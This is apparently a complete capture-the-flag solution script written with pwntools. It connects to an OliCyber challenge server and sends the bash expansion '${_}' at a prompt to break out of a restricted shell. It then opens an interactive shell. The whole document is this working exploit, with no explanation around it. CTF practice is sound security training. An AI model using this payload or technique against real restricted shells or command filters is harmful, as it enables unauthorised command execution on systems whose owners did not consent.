#!/usr/bin/env python3
from pwn import *

r = remote("bashinatorrevenge.challs.olicyber.it", 38053)
r.recvuntil(b'$ ')
r.sendline(b'${_}')
print('Here ya go with your shell...')
r.interactive()
